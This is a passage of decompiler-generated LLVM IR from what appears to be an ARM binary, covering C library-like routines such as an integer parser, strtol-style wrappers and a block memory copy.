dec_label_pc_14ee0:                               ; preds = %dec_label_pc_14eb0, %dec_label_pc_14ec4
  %v0_14ee0 = phi i32 [ %v0_14ee0.pre, %dec_label_pc_14eb0 ], [ 0, %dec_label_pc_14ec4 ]
  ret i32 %v0_14ee0

; uselistorder directives
  uselistorder i32 %v1_14e90, { 2, 1, 0 }
  uselistorder i32 63, { 0, 7, 5, 4, 8, 1, 10, 2, 9, 3, 11, 6 }
  uselistorder label %dec_label_pc_14ee0, { 1, 0 }
}

define i32 @function_14ef0(i32* %arg1) local_unnamed_addr {
dec_label_pc_14ef0:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_14ef8 = add i32 %tmp, 4
  %v3_14ef8 = inttoptr i32 %v2_14ef8 to i32*
  store i32 0, i32* %v3_14ef8, align 4
  %v1_14efc = load i32, i32* %r3.global-to-local, align 4
  %v2_14efc = inttoptr i32 %v1_14efc to i32*
  store i32 0, i32* %v2_14efc, align 4
  ret i32 0
}

define i32 @function_14f04(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14f04:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v6_14f04 = load i32, i32* @r5, align 4
  %v9_14f04 = load i32, i32* @r6, align 4
  %v2_14f08 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  %v3_14f20 = bitcast i32* %stack_var_-296 to i8*
  %v4_14f20 = call i32 @function_15594(i8* %v3_14f20, i32 0, i32 140)
  %v0_14f28 = load i32, i32* @r5, align 4
  store i32 %v2_14f08, i32* @r1, align 4
  %v2_14f30 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_14f30, i32* @r2, align 4
  %v0_14f34 = load i32, i32* @r6, align 4
  store i32 %v0_14f34, i32* %stack_var_-296, align 4
  %v5_14f3c = call i32 @function_16eec(i32 %v0_14f28, i32 %v2_14f08, i32 %v2_14f30, i32 268435456, i32 %v0_14f34)
  %v1_14f40 = icmp slt i32 %v5_14f3c, 0
  br i1 %v1_14f40, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_14f04
  %v6_14f44 = load i32, i32* %stack_var_-156, align 4
  br label %bb11

bb10:                                             ; preds = %dec_label_pc_14f04
  br label %bb11

bb11:                                             ; preds = %bb, %bb10
  %v1_14f58 = phi i32 [ %v6_14f44, %bb ], [ -1, %bb10 ]
  store i32 %v6_14f04, i32* @r5, align 4
  store i32 %v9_14f04, i32* @r6, align 4
  ret i32 %v1_14f58

; uselistorder directives
  uselistorder i32* %stack_var_-296, { 1, 0, 2 }
  uselistorder i32 (i8*, i32, i32)* @function_15594, { 0, 4, 6, 7, 1, 2, 3, 5 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_14f5c() local_unnamed_addr {
dec_label_pc_14f5c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14f5c = load i32, i32* @r4, align 4
  store i32 %v3_14f5c, i32* %stack_var_-8, align 4
  %v0_14f60 = call i32 @function_15948()
  store i32 %v0_14f60, i32* %r4.global-to-local, align 4
  %v2_14f64 = icmp eq i32 %v0_14f60, 0
  br i1 %v2_14f64, label %dec_label_pc_14f78, label %dec_label_pc_14f6c

dec_label_pc_14f6c:                               ; preds = %dec_label_pc_14f5c
  %v0_14f6c = call i32 @function_12f18()
  %v0_14f70 = load i32, i32* %r4.global-to-local, align 4
  %v2_14f70 = inttoptr i32 %v0_14f6c to i32*
  store i32 %v0_14f70, i32* %v2_14f70, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14f78

dec_label_pc_14f78:                               ; preds = %dec_label_pc_14f5c, %dec_label_pc_14f6c
  %v0_14f78 = phi i32 [ 0, %dec_label_pc_14f5c ], [ -1, %dec_label_pc_14f6c ]
  %v2_14f7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14f7c, i32* @r4, align 4
  ret i32 %v0_14f78

; uselistorder directives
  uselistorder label %dec_label_pc_14f78, { 1, 0 }
}

define i32 @function_14f84(i32 %arg1) local_unnamed_addr {
dec_label_pc_14f84:
  %v0_14f90.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14f90

dec_label_pc_14f8c:                               ; preds = %dec_label_pc_14f90, %bb29
  %v1_14f8c = add i32 %v0_14f8c, 1
  br label %dec_label_pc_14f90

dec_label_pc_14f90:                               ; preds = %dec_label_pc_14f84, %dec_label_pc_14f8c
  %v0_14f8c = phi i32 [ %v0_14f90.pre, %dec_label_pc_14f84 ], [ %v1_14f8c, %dec_label_pc_14f8c ]
  %v1_14f90 = inttoptr i32 %v0_14f8c to i8*
  %v2_14f90 = load i8, i8* %v1_14f90, align 1
  %v3_14f90 = zext i8 %v2_14f90 to i32
  %v1_14f94 = add nsw i32 %v3_14f90, -9
  %v7_14f98 = icmp eq i8 %v2_14f90, 32
  br i1 %v7_14f98, label %dec_label_pc_14f8c, label %bb

bb:                                               ; preds = %dec_label_pc_14f90
  %v3_14f9c = icmp ugt i32 %v1_14f94, 3
  %v8_14f9c = icmp eq i32 %v1_14f94, 4
  %v2_14fa0 = xor i1 %v8_14f9c, true
  %v3_14fa0 = and i1 %v3_14f9c, %v2_14fa0
  br i1 %v3_14fa0, label %bb28, label %bb29

bb28:                                             ; preds = %bb
  br label %bb29

bb29:                                             ; preds = %bb, %bb28
  %v1_14fb87 = phi i32 [ %v1_14f94, %bb ], [ 0, %bb28 ]
  %v2_14fa4 = xor i1 %v3_14f9c, true
  %v3_14fa4 = or i1 %v8_14f9c, %v2_14fa4
  br i1 %v3_14fa4, label %dec_label_pc_14f8c, label %dec_label_pc_14fac

dec_label_pc_14fac:                               ; preds = %bb29
  %v7_14fac = icmp eq i8 %v2_14f90, 43
  br i1 %v7_14fac, label %dec_label_pc_14fcc, label %dec_label_pc_14fb4

dec_label_pc_14fb4:                               ; preds = %dec_label_pc_14fac
  %v7_14fb4 = icmp eq i8 %v2_14f90, 45
  br i1 %v7_14fb4, label %dec_label_pc_14fcc, label %bb30

bb30:                                             ; preds = %dec_label_pc_14fb4
  br label %dec_label_pc_14fd0

dec_label_pc_14fcc:                               ; preds = %dec_label_pc_14fac, %dec_label_pc_14fb4
  %storemerge = phi i32 [ 1, %dec_label_pc_14fb4 ], [ %v1_14fb87, %dec_label_pc_14fac ]
  %v1_14fcc = add i32 %v0_14f8c, 1
  br label %dec_label_pc_14fd0

dec_label_pc_14fd0:                               ; preds = %bb30, %dec_label_pc_14fcc
  %v0_14ff8 = phi i32 [ %v1_14fb87, %bb30 ], [ %storemerge, %dec_label_pc_14fcc ]
  %v0_14fe89 = phi i32 [ %v0_14f8c, %bb30 ], [ %v1_14fcc, %dec_label_pc_14fcc ]
  br label %dec_label_pc_14fe8

dec_label_pc_14fdc:                               ; preds = %dec_label_pc_14fe8
  %v2_14fdc = mul i32 %v0_14fdc, 10
  %v1_14fe0 = add i32 %v0_14fe0, 1
  %v2_14fe4 = sub i32 %v2_14fdc, %v1_14fec
  br label %dec_label_pc_14fe8

dec_label_pc_14fe8:                               ; preds = %dec_label_pc_14fd0, %dec_label_pc_14fdc
  %v0_14fdc = phi i32 [ 0, %dec_label_pc_14fd0 ], [ %v2_14fe4, %dec_label_pc_14fdc ]
  %v0_14fe0 = phi i32 [ %v0_14fe89, %dec_label_pc_14fd0 ], [ %v1_14fe0, %dec_label_pc_14fdc ]
  %v1_14fe8 = inttoptr i32 %v0_14fe0 to i8*
  %v2_14fe8 = load i8, i8* %v1_14fe8, align 1
  %v3_14fe8 = zext i8 %v2_14fe8 to i32
  %v1_14fec = add nsw i32 %v3_14fe8, -48
  %tmp = icmp ult i32 %v1_14fec, 10
  br i1 %tmp, label %dec_label_pc_14fdc, label %dec_label_pc_14ff8

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14fe8
  %v2_14ff8 = icmp eq i32 %v0_14ff8, 0
  br i1 %v2_14ff8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_14ff8
  %v2_14ffc = sub i32 0, %v0_14fdc
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_14ff8, %bb32
  %v0_15000 = phi i32 [ %v0_14fdc, %dec_label_pc_14ff8 ], [ %v2_14ffc, %bb32 ]
  ret i32 %v0_15000

; uselistorder directives
  uselistorder i32 %v0_14fe0, { 1, 0 }
  uselistorder i32 %v1_14fb87, { 1, 0 }
  uselistorder i1 %v8_14f9c, { 1, 0 }
  uselistorder i32 %v0_14f8c, { 0, 1, 3, 2 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder i8 32, { 14, 8, 9, 10, 0, 11, 12, 13, 1, 2, 3, 4, 5, 6, 7, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_14fe8, { 1, 0 }
  uselistorder label %dec_label_pc_14fd0, { 1, 0 }
  uselistorder label %dec_label_pc_14fcc, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_14f90, { 1, 0 }
  uselistorder label %dec_label_pc_14f8c, { 1, 0 }
}

define i32 @function_1500c() local_unnamed_addr {
dec_label_pc_1500c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v6_1500c = load i32, i32* @r5, align 4
  %v9_1500c = load i32, i32* @r6, align 4
  %v12_1500c = load i32, i32* @r7, align 4
  %v0_15010 = load i32, i32* @r0, align 4
  store i32 %v0_15010, i32* @r5, align 4
  %v1_15010 = icmp slt i32 %v0_15010, 0
  %v4_1501c = add i32 %v0_15010, 2147483647
  %storemerge = select i1 %v1_15010, i32 -1, i32 %v4_1501c
  %v2_15020 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_15020, i32* @r4, align 4
  %v0_15024 = load i32, i32* @r1, align 4
  store i32 %v0_15024, i32* @r7, align 4
  %v0_15030 = load i32, i32* @r2, align 4
  store i32 %v0_15030, i32* @r6, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v7_15054 = call i32 @function_16764(i32 %v2_15020, i32 0, i32 0, i32 0, i32 0, i32 %v0_15010, i32 %storemerge)
  store i32 %tmp3, i32* @r4, align 4
  %v0_15064 = load i32, i32* @r6, align 4
  %v6_15070 = sext i32 %v0_15064 to i64
  %v7_15070 = call i32 @function_15fa4(i32 %v2_15020, i64 %v6_15070, i32 1, i32 %tmp12, i32 %tmp12, i32 %tmp3)
  %v0_15074 = load i32, i32* @r7, align 4
  %v2_15074 = icmp eq i32 %v0_15074, 0
  br i1 %v2_15074, label %dec_label_pc_15098, label %dec_label_pc_1507c

dec_label_pc_1507c:                               ; preds = %dec_label_pc_1500c
  %v0_15090 = load i32, i32* @r5, align 4
  %v2_15084 = add i32 %v0_15010, %tmp
  %v2_1508c = sub i32 %v2_15084, %storemerge
  %v2_15090 = add i32 %v2_1508c, %v0_15090
  %v2_15094 = inttoptr i32 %v0_15074 to i32*
  store i32 %v2_15090, i32* %v2_15094, align 4
  br label %dec_label_pc_15098

dec_label_pc_15098:                               ; preds = %dec_label_pc_1500c, %dec_label_pc_1507c
  store i32 %v6_1500c, i32* @r5, align 4
  store i32 %v9_1500c, i32* @r6, align 4
  store i32 %v12_1500c, i32* @r7, align 4
  ret i32 %v7_15070

; uselistorder directives
  uselistorder i32 %v2_15020, { 1, 0, 2 }
  uselistorder i32 %v0_15010, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_15098, { 1, 0 }
}

define i32 @function_150a4() local_unnamed_addr {
dec_label_pc_150a4:
  store i32 0, i32* @r4, align 4
  %v0_150b8 = call i32 @function_1500c()
  ret i32 %v0_150b8
}

define i32 @function_150c8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_150c8:
  %v3_150c8 = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_150dc = call i32 @function_1500c()
  store i32 %v3_150c8, i32* @r4, align 4
  ret i32 %v0_150dc
}

define i32 @function_150ec() local_unnamed_addr {
dec_label_pc_150ec:
  store i32 -2147483648, i32* @r4, align 4
  %v0_15100 = call i32 @function_1500c()
  ret i32 %v0_15100
}

define i32 @function_15114() local_unnamed_addr {
dec_label_pc_15114:
  store i32 -1, i32* @r4, align 4
  %v0_15128 = call i32 @function_1500c()
  ret i32 %v0_15128

; uselistorder directives
  uselistorder i32 ()* @function_1500c, { 3, 2, 0, 1 }
}

define i32 @function_1513c(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1513c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_n.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1513c = load i32, i32* %r0.global-to-local, align 4
  %v8_1513c = load i32, i32* @r4, align 4
  %v11_1513c = load i32, i32* @lr, align 4
  %v0_15144 = load i32, i32* %r2.global-to-local, align 4
  %v1_15144 = add i32 %v0_15144, -4
  %v2_15144 = icmp ugt i32 %v0_15144, 3
  store i1 %v2_15144, i1* %cpsr_c.global-to-local, align 1
  %v6_15144 = icmp slt i32 %v1_15144, 0
  store i1 %v6_15144, i1* %cpsr_n.global-to-local, align 1
  %v3_15148 = icmp ult i32 %v0_15144, 2
  br i1 %v3_15148, label %dec_label_pc_15418, label %dec_label_pc_1514c

dec_label_pc_1514c:                               ; preds = %dec_label_pc_1513c
  %v0_1514c = load i32, i32* %r1.global-to-local, align 4
  %v1_1514c = sub i32 0, %v0_1514c
  %v1_15150 = urem i32 %v1_1514c, 4
  store i32 %v1_15150, i32* @r3, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15150 = icmp eq i32 %v1_15150, 0
  br i1 %v2_15150, label %.thread1, label %dec_label_pc_15158

dec_label_pc_15158:                               ; preds = %dec_label_pc_1514c
  %v1_15158 = and i32 %v1_1514c, 2
  %v2_15158 = icmp ne i32 %v1_15158, 0
  store i1 %v2_15158, i1* %cpsr_c.global-to-local, align 1
  %v3_15158 = shl i32 %v1_1514c, 31
  store i32 %v3_15158, i32* %ip.global-to-local, align 4
  %v4_15158 = icmp ne i32 %v3_15158, 0
  store i1 %v4_15158, i1* %cpsr_n.global-to-local, align 1
  %v2_1515c = sub i32 %v0_15144, %v1_15150
  store i32 %v2_1515c, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_15150 to i8
  br i1 %v4_15158, label %bb, label %bb127

bb:                                               ; preds = %dec_label_pc_15158
  %v2_15160 = inttoptr i32 %v0_1514c to i8*
  %v3_15160 = load i8, i8* %v2_15160, align 1
  %v4_15160 = zext i8 %v3_15160 to i32
  store i32 %v4_15160, i32* @r3, align 4
  %v6_15160 = add i32 %v0_1514c, 1
  store i32 %v6_15160, i32* %r1.global-to-local, align 4
  br label %bb127

bb127:                                            ; preds = %dec_label_pc_15158, %bb
  %v1_1516c.off0 = phi i8 [ %extract.t, %dec_label_pc_15158 ], [ %v3_15160, %bb ]
  %v1_15164 = phi i32 [ %v0_1514c, %dec_label_pc_15158 ], [ %v6_15160, %bb ]
  %extract.t190 = trunc i32 %v8_1513c to i8
  br i1 %v2_15158, label %bb128, label %.thread

bb128:                                            ; preds = %bb127
  %v2_15164 = inttoptr i32 %v1_15164 to i8*
  %v3_15164 = load i8, i8* %v2_15164, align 1
  %v4_15164 = zext i8 %v3_15164 to i32
  store i32 %v4_15164, i32* @r4, align 4
  %v6_15164 = add i32 %v1_15164, 1
  store i32 %v6_15164, i32* %r1.global-to-local, align 4
  %v2_15168 = inttoptr i32 %v6_15164 to i8*
  %v3_15168 = load i8, i8* %v2_15168, align 1
  %v4_15168 = zext i8 %v3_15168 to i32
  store i32 %v4_15168, i32* %ip.global-to-local, align 4
  %v6_15168 = add i32 %v1_15164, 2
  store i32 %v6_15168, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb127, %bb128
  %v1_15170181.off0 = phi i8 [ %extract.t190, %bb127 ], [ %v3_15164, %bb128 ]
  br i1 %v4_15158, label %bb129, label %bb130

bb129:                                            ; preds = %.thread
  %v4_1516c = inttoptr i32 %v3_1513c to i8*
  store i8 %v1_1516c.off0, i8* %v4_1516c, align 1
  %v5_1516c = load i32, i32* %r0.global-to-local, align 4
  %v6_1516c = add i32 %v5_1516c, 1
  store i32 %v6_1516c, i32* %r0.global-to-local, align 4
  %v0_15170.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15170.pre, label %bb129.bb131_crit_edge, label %.thread1

bb129.bb131_crit_edge:                            ; preds = %bb129
  %v1_15170.pre = load i32, i32* @r4, align 4
  %extract.t188 = trunc i32 %v1_15170.pre to i8
  br label %bb131

bb130:                                            ; preds = %.thread
  br i1 %v2_15158, label %bb131, label %.thread1

bb131:                                            ; preds = %bb129.bb131_crit_edge, %bb130
  %v1_15170.off0 = phi i8 [ %extract.t188, %bb129.bb131_crit_edge ], [ %v1_15170181.off0, %bb130 ]
  %v3_1517087 = phi i32 [ %v6_1516c, %bb129.bb131_crit_edge ], [ %v3_1513c, %bb130 ]
  %v4_15170 = inttoptr i32 %v3_1517087 to i8*
  store i8 %v1_15170.off0, i8* %v4_15170, align 1
  %v5_15170 = load i32, i32* %r0.global-to-local, align 4
  %v6_15170 = add i32 %v5_15170, 1
  store i32 %v6_15170, i32* %r0.global-to-local, align 4
  %v0_15174.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15174.pr, label %bb132, label %.thread1

bb132:                                            ; preds = %bb131
  %v1_15174 = load i32, i32* %ip.global-to-local, align 4
  %v2_15174 = trunc i32 %v1_15174 to i8
  %v4_15174 = inttoptr i32 %v6_15170 to i8*
  store i8 %v2_15174, i8* %v4_15174, align 1
  %v5_15174 = load i32, i32* %r0.global-to-local, align 4
  %v6_15174 = add i32 %v5_15174, 1
  store i32 %v6_15174, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %bb129, %bb130, %dec_label_pc_1514c, %bb131, %bb132
  %v1_151a8 = phi i32 [ %v3_1513c, %bb130 ], [ %v3_1513c, %dec_label_pc_1514c ], [ %v6_15170, %bb131 ], [ %v6_15174, %bb132 ], [ %v6_1516c, %bb129 ]
  %v1_15178 = load i32, i32* %r1.global-to-local, align 4
  %v2_15178 = xor i32 %v1_15178, %v1_151a8
  store i32 %v2_15178, i32* @ip, align 4
  %v1_1517c = urem i32 %v2_15178, 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1517c = icmp eq i32 %v1_1517c, 0
  br i1 %v2_1517c, label %dec_label_pc_15184, label %dec_label_pc_1522c

dec_label_pc_15184:                               ; preds = %.thread1
  %v2_15184 = load i32, i32* @r5, align 4
  store i32 %v2_15184, i32* %stack_var_-40, align 4
  %v5_15184 = load i32, i32* @r6, align 4
  %v8_15184 = load i32, i32* @r7, align 4
  %v11_15184 = load i32, i32* @r8, align 4
  %v14_15184 = load i32, i32* @sb, align 4
  %v17_15184 = load i32, i32* @sl, align 4
  %v20_15184 = load i32, i32* @fp, align 4
  %v1_15188 = sub i32 0, %v1_151a8
  %v1_1518c = and i32 %v1_15188, 28
  store i32 %v1_1518c, i32* @r3, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1518c = icmp eq i32 %v1_1518c, 0
  %v0_151c0.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_1518c, label %dec_label_pc_151c0, label %dec_label_pc_15194

dec_label_pc_15194:                               ; preds = %dec_label_pc_15184
  %v2_15194 = sub i32 %v1_1518c, %v0_151c0.pre
  %v3_15194 = icmp uge i32 %v1_1518c, %v0_151c0.pre
  store i1 %v3_15194, i1* %cpsr_c.global-to-local, align 1
  %v8_15194 = icmp slt i32 %v2_15194, 0
  store i1 %v8_15194, i1* %cpsr_n.global-to-local, align 1
  %tmp196 = icmp ugt i32 %v1_1518c, %v0_151c0.pre
  br i1 %tmp196, label %bb133, label %bb134

bb133:                                            ; preds = %dec_label_pc_15194
  %v5_15198 = and i32 %v0_151c0.pre, 28
  store i32 %v5_15198, i32* @r3, align 4
  br label %bb134

bb134:                                            ; preds = %dec_label_pc_15194, %bb133
  %v0_1519c = phi i32 [ %v1_1518c, %dec_label_pc_15194 ], [ %v5_15198, %bb133 ]
  %v1_1519c = and i32 %v0_1519c, 16
  %v2_1519c = icmp ne i32 %v1_1519c, 0
  store i1 %v2_1519c, i1* %cpsr_c.global-to-local, align 1
  %v3_1519c = mul i32 %v0_1519c, 268435456
  store i32 %v3_1519c, i32* @ip, align 4
  %v4_1519c = icmp slt i32 %v3_1519c, 0
  store i1 %v4_1519c, i1* %cpsr_n.global-to-local, align 1
  br i1 %v2_1519c, label %bb135, label %bb136

bb135:                                            ; preds = %bb134
  %v2_151a0 = inttoptr i32 %v1_15178 to i32*
  %v3_151a0 = load i32, i32* %v2_151a0, align 4
  store i32 %v3_151a0, i32* @r4, align 4
  %v4_151a0 = add i32 %v1_15178, 4
  %v5_151a0 = inttoptr i32 %v4_151a0 to i32*
  %v6_151a0 = load i32, i32* %v5_151a0, align 4
  store i32 %v6_151a0, i32* @r5, align 4
  %v7_151a0 = add i32 %v1_15178, 8
  %v8_151a0 = inttoptr i32 %v7_151a0 to i32*
  %v9_151a0 = load i32, i32* %v8_151a0, align 4
  store i32 %v9_151a0, i32* @r6, align 4
  %v10_151a0 = add i32 %v1_15178, 12
  %v11_151a0 = inttoptr i32 %v10_151a0 to i32*
  %v12_151a0 = load i32, i32* %v11_151a0, align 4
  store i32 %v12_151a0, i32* @r7, align 4
  %v13_151a0 = add i32 %v1_15178, 16
  store i32 %v13_151a0, i32* %r1.global-to-local, align 4
  br i1 %v4_1519c, label %bb137, label %.thread88

bb136:                                            ; preds = %bb134
  br i1 %v4_1519c, label %bb137, label %.thread92

bb137:                                            ; preds = %bb136, %bb135
  %v1_151a4 = phi i32 [ %v13_151a0, %bb135 ], [ %v1_15178, %bb136 ]
  %v2_151a4 = inttoptr i32 %v1_151a4 to i32*
  %v3_151a4 = load i32, i32* %v2_151a4, align 4
  store i32 %v3_151a4, i32* @r8, align 4
  %v4_151a4 = add i32 %v1_151a4, 4
  %v5_151a4 = inttoptr i32 %v4_151a4 to i32*
  %v6_151a4 = load i32, i32* %v5_151a4, align 4
  store i32 %v6_151a4, i32* @sb, align 4
  %v7_151a4 = add i32 %v1_151a4, 8
  store i32 %v7_151a4, i32* %r1.global-to-local, align 4
  br i1 %v2_1519c, label %bb137..thread88_crit_edge, label %.thread90

bb137..thread88_crit_edge:                        ; preds = %bb137
  %v3_151a8.pre = load i32, i32* @r4, align 4
  br label %.thread88

.thread88:                                        ; preds = %bb137..thread88_crit_edge, %bb135
  %v3_151a8 = phi i32 [ %v3_151a8.pre, %bb137..thread88_crit_edge ], [ %v3_151a0, %bb135 ]
  %v2_151a8 = inttoptr i32 %v1_151a8 to i32*
  store i32 %v3_151a8, i32* %v2_151a8, align 4
  %v4_151a8 = add i32 %v1_151a8, 4
  %v5_151a8 = inttoptr i32 %v4_151a8 to i32*
  %v6_151a8 = load i32, i32* @r5, align 4
  store i32 %v6_151a8, i32* %v5_151a8, align 4
  %v7_151a8 = add i32 %v1_151a8, 8
  %v8_151a8 = inttoptr i32 %v7_151a8 to i32*
  %v9_151a8 = load i32, i32* @r6, align 4
  store i32 %v9_151a8, i32* %v8_151a8, align 4
  %v10_151a8 = add i32 %v1_151a8, 12
  %v11_151a8 = inttoptr i32 %v10_151a8 to i32*
  %v12_151a8 = load i32, i32* @r7, align 4
  store i32 %v12_151a8, i32* %v11_151a8, align 4
  %v13_151a8 = add i32 %v1_151a8, 16
  store i32 %v13_151a8, i32* %r0.global-to-local, align 4
  br i1 %v4_1519c, label %.thread88..thread90_crit_edge, label %.thread92

.thread88..thread90_crit_edge:                    ; preds = %.thread88
  %v3_151ac.pre = load i32, i32* @r8, align 4
  br label %.thread90

.thread90:                                        ; preds = %.thread88..thread90_crit_edge, %bb137
  %v3_151ac = phi i32 [ %v3_151ac.pre, %.thread88..thread90_crit_edge ], [ %v3_151a4, %bb137 ]
  %v1_151ac91 = phi i32 [ %v13_151a8, %.thread88..thread90_crit_edge ], [ %v1_151a8, %bb137 ]
  %v2_151ac = inttoptr i32 %v1_151ac91 to i32*
  store i32 %v3_151ac, i32* %v2_151ac, align 4
  %v4_151ac = add i32 %v1_151ac91, 4
  %v5_151ac = inttoptr i32 %v4_151ac to i32*
  %v6_151ac = load i32, i32* @sb, align 4
  store i32 %v6_151ac, i32* %v5_151ac, align 4
  %v7_151ac = add i32 %v1_151ac91, 8
  store i32 %v7_151ac, i32* %r0.global-to-local, align 4
  br label %.thread92

.thread92:                                        ; preds = %bb136, %.thread88, %.thread90
  %v2_151b8 = phi i32 [ %v13_151a8, %.thread88 ], [ %v7_151ac, %.thread90 ], [ %v1_151a8, %bb136 ]
  %v0_151b0 = load i32, i32* @r3, align 4
  %v1_151b0 = and i32 %v0_151b0, 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_151b0 = icmp eq i32 %v1_151b0, 0
  br i1 %v2_151b0, label %.thread2, label %bb138

bb138:                                            ; preds = %.thread92
  %v1_151b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_151b4 = inttoptr i32 %v1_151b4 to i32*
  %v3_151b4 = load i32, i32* %v2_151b4, align 4
  store i32 %v3_151b4, i32* %sl.global-to-local, align 4
  %v5_151b4 = add i32 %v1_151b4, 4
  store i32 %v5_151b4, i32* %r1.global-to-local, align 4
  %v3_151b8 = inttoptr i32 %v2_151b8 to i32*
  store i32 %v3_151b4, i32* %v3_151b8, align 4
  %v4_151b8 = load i32, i32* %r0.global-to-local, align 4
  %v5_151b8 = add i32 %v4_151b8, 4
  store i32 %v5_151b8, i32* %r0.global-to-local, align 4
  %v1_151bc.pre = load i32, i32* @r3, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread92, %bb138
  %v0_151d064 = phi i32 [ %v2_151b8, %.thread92 ], [ %v5_151b8, %bb138 ]
  %v1_151bc = phi i32 [ %v0_151b0, %.thread92 ], [ %v1_151bc.pre, %bb138 ]
  %v0_151bc = load i32, i32* %r2.global-to-local, align 4
  %v2_151bc = sub i32 %v0_151bc, %v1_151bc
  store i32 %v2_151bc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_151c0

dec_label_pc_151c0:                               ; preds = %dec_label_pc_15184, %.thread2
  %v0_151d063 = phi i32 [ %v0_151d064, %.thread2 ], [ %v1_151a8, %dec_label_pc_15184 ]
  %v0_151c0 = phi i32 [ %v2_151bc, %.thread2 ], [ %v0_151c0.pre, %dec_label_pc_15184 ]
  %v1_151c0 = add i32 %v0_151c0, -32
  store i32 %v1_151c0, i32* @r2, align 4
  %v2_151c0 = icmp ugt i32 %v0_151c0, 31
  store i1 %v2_151c0, i1* %cpsr_c.global-to-local, align 1
  %v6_151c0 = icmp slt i32 %v1_151c0, 0
  store i1 %v6_151c0, i1* %cpsr_n.global-to-local, align 1
  %v3_151c4 = icmp ult i32 %v1_151c0, 30
  br i1 %v3_151c4, label %dec_label_pc_151dc, label %dec_label_pc_151c8

dec_label_pc_151c8:                               ; preds = %dec_label_pc_151c0, %dec_label_pc_151c8.dec_label_pc_151c8_crit_edge
  %v0_151d0 = phi i32 [ %v24_151d0, %dec_label_pc_151c8.dec_label_pc_151c8_crit_edge ], [ %v0_151d063, %dec_label_pc_151c0 ]
  %v0_151cc = phi i32 [ %v0_151cc.pre, %dec_label_pc_151c8.dec_label_pc_151c8_crit_edge ], [ %v1_151c0, %dec_label_pc_151c0 ]
  %v0_151c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_151c8 = inttoptr i32 %v0_151c8 to i32*
  %v2_151c8 = load i32, i32* %v1_151c8, align 4
  store i32 %v2_151c8, i32* @r4, align 4
  %v3_151c8 = add i32 %v0_151c8, 4
  %v4_151c8 = inttoptr i32 %v3_151c8 to i32*
  %v5_151c8 = load i32, i32* %v4_151c8, align 4
  store i32 %v5_151c8, i32* @r5, align 4
  %v6_151c8 = add i32 %v0_151c8, 8
  %v7_151c8 = inttoptr i32 %v6_151c8 to i32*
  %v8_151c8 = load i32, i32* %v7_151c8, align 4
  store i32 %v8_151c8, i32* @r6, align 4
  %v9_151c8 = add i32 %v0_151c8, 12
  %v10_151c8 = inttoptr i32 %v9_151c8 to i32*
  %v11_151c8 = load i32, i32* %v10_151c8, align 4
  store i32 %v11_151c8, i32* @r7, align 4
  %v12_151c8 = add i32 %v0_151c8, 16
  %v13_151c8 = inttoptr i32 %v12_151c8 to i32*
  %v14_151c8 = load i32, i32* %v13_151c8, align 4
  store i32 %v14_151c8, i32* @r8, align 4
  %v15_151c8 = add i32 %v0_151c8, 20
